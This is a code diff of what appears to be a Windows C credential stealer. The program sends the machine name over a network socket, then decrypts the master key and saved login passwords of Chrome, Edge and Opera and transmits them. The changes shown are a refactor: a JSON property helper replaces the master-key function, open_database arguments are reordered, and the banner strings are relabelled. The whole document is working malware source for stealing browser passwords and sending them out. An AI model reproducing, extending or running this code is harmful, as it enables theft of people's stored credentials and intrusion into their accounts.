@@ -38,15 +38,15 @@ int main() {
 
 	send_machineName(ConnectSocket);
 
-	sprintf_s(message, DEFAULT_BUFLEN * sizeof(CHAR), "------------------------ Google Chrome Dump ---------------------\n");
+	sprintf_s(message, DEFAULT_BUFLEN * sizeof(CHAR), "------------------------ Google Chrome ---------------------\n");
 	send_data(message, ConnectSocket);
 	dump_chrome(ConnectSocket, message, DEFAULT_BUFLEN);
 
-	sprintf_s(message, DEFAULT_BUFLEN * sizeof(CHAR), "------------------------ Microsoft Edge dump ---------------------\n");
+	sprintf_s(message, DEFAULT_BUFLEN * sizeof(CHAR), "------------------------ Microsoft Edge ---------------------\n");
 	send_data(message, ConnectSocket);
 	dump_edge(ConnectSocket, message, DEFAULT_BUFLEN);
-	
-	sprintf_s(message, DEFAULT_BUFLEN * sizeof(CHAR), "------------------------ Opera dump ---------------------\n");
+
+	sprintf_s(message, DEFAULT_BUFLEN * sizeof(CHAR), "------------------------ Opera ---------------------\n");
 	send_data(message, ConnectSocket);
 	dump_opera(ConnectSocket, message, DEFAULT_BUFLEN);
 
@@ -65,7 +65,7 @@ BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 
 	/* Get, decrypt the MasterKey of chrome and then use it to obtain the AES-GCM decryption handler which is used to decrypt passwords */
 	WCHAR enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };
-	if (!get_encrypted_masterkey(chrome_dir, L"Local State", enc_master_key, ENC_MASTER_KEY_LEN, message, message_size)) {
+	if (!get_json_property(chrome_dir, L"Local State", L"encrypted_key", enc_master_key, ENC_MASTER_KEY_LEN, message, message_size)) {
 		Debug(send_data(message, ConnectSocket);)
 		return FALSE;
 	}
@@ -124,7 +124,7 @@ BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 
 			/* Open database connection */
 			void* handle_db;																		// Handle to SQLite Database handle
-			BOOL database_con_status = open_database(logindata_path, &handle_db, message, message_size, FALSE);
+			BOOL database_con_status = open_database(logindata_path, &handle_db, FALSE, message, message_size);
 			if (!database_con_status) {
 				Debug(send_data(message, ConnectSocket);)
 				continue;
@@ -139,7 +139,7 @@ BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 					Debug(send_data(message, ConnectSocket);)
 					continue;
 				}
-				database_con_status = open_database(logindata_path, &handle_db, message, message_size, TRUE);
+				database_con_status = open_database(logindata_path, &handle_db, TRUE, message, message_size);
 				if (!database_con_status) {
 					Debug(send_data(message, ConnectSocket);)
 					continue;
@@ -185,7 +185,6 @@ BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 	free(decrypted_credential);
 }
 
-
 BOOL dump_edge(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 	/* Gets the Edge Folder if exists */
 	WCHAR edge_dir[MAX_PATH] = { L'\0' };													// Buffer to hold Edge directory
@@ -196,7 +195,7 @@ BOOL dump_edge(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 
 	/* Get, decrypt the MasterKey of Edge and then use it to obtain the AES-GCM decryption handler which is used to decrypt passwords */
 	WCHAR enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };
-	if (!get_encrypted_masterkey(edge_dir, L"Local State", enc_master_key, ENC_MASTER_KEY_LEN, message, message_size)) {
+	if (!get_json_property(edge_dir, L"Local State", L"encrypted_key", enc_master_key, ENC_MASTER_KEY_LEN, message, message_size)) {
 		Debug(send_data(message, ConnectSocket);)
 			return FALSE;
 	}
@@ -255,7 +254,7 @@ BOOL dump_edge(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 			
 			/* Open database connection */
 			void* handle_db;																		// Handle to SQLite Database handle
-			BOOL database_con_status = open_database(logindata_path, &handle_db, message, message_size, FALSE);
+			BOOL database_con_status = open_database(logindata_path, &handle_db, FALSE, message, message_size);
 			if (!database_con_status) {
 				Debug(send_data(message, ConnectSocket);)
 					continue;
@@ -270,7 +269,7 @@ BOOL dump_edge(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 						Debug(send_data(message, ConnectSocket);)
 						continue;
 				}
-				database_con_status = open_database(logindata_path, &handle_db, message, message_size, TRUE);
+				database_con_status = open_database(logindata_path, &handle_db, TRUE, message, message_size);
 				if (!database_con_status) {
 					Debug(send_data(message, ConnectSocket);)
 						continue;
@@ -315,7 +314,6 @@ BOOL dump_edge(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 	/* Free allocated memory to prevent leaks */
 	free(decrypted_credential);
 }
-
 
 BOOL dump_opera(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 	/* Gets the main Opera Software Folder if exists */
@@ -363,7 +361,7 @@ BOOL dump_opera(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 
 			/* Get, decrypt the MasterKey of Edge and then use it to obtain the AES-GCM decryption handler which is used to decrypt passwords */
 			WCHAR enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };
-			if (!get_encrypted_masterkey(browser_path, L"Local State", enc_master_key, ENC_MASTER_KEY_LEN, message, message_size)) {
+			if (!get_json_property(browser_path, L"Local State", L"encrypted_key", enc_master_key, ENC_MASTER_KEY_LEN, message, message_size)) {
 				Debug(send_data(message, ConnectSocket);)
 				return FALSE;
 			}
@@ -388,7 +386,7 @@ BOOL dump_opera(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 
 			/* Open database connection */
 			void* handle_db;																		// Handle to SQLite Database handle
-			BOOL database_con_status = open_database(browser_path, &handle_db, message, message_size, FALSE);
+			BOOL database_con_status = open_database(browser_path, &handle_db, FALSE, message, message_size);
 			if (!database_con_status) {
 				Debug(send_data(message, ConnectSocket);)
 				continue;
@@ -403,7 +401,7 @@ BOOL dump_opera(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 					Debug(send_data(message, ConnectSocket);)
 					continue;
 				}
-				database_con_status = open_database(browser_path, &handle_db, message, message_size, TRUE);
+				database_con_status = open_database(browser_path, &handle_db, TRUE, message, message_size);
 				if (!database_con_status) {
 					Debug(send_data(message, ConnectSocket);)
 					continue;
